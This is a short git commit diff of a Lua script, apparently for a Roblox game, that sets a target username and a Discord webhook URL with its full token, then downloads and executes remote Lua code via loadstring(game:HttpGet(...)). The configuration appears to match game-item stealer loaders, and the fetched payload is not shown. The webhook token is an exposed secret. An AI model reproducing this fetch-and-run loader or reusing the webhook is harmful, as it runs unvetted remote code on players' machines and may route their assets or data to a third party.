08059d26c4dde84cbfa77a37850b2d2a7d70d15c
Alwwex <118074781+Alwwex@users.noreply.github.com>
2023-02-14 19:52:36 +0100

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,4 +1,4 @@
 UserName = "alexandrugutu07"
 WebHook = "https://discord.com/api/webhooks/1075126663513374820/pSJJbY9xtdj5gORNU83ytVvwnU_a8E3DSIbz0UuMlIA_QKuV53Mya7Ud63P6OfNWC9S-"
 Mention = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))(
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
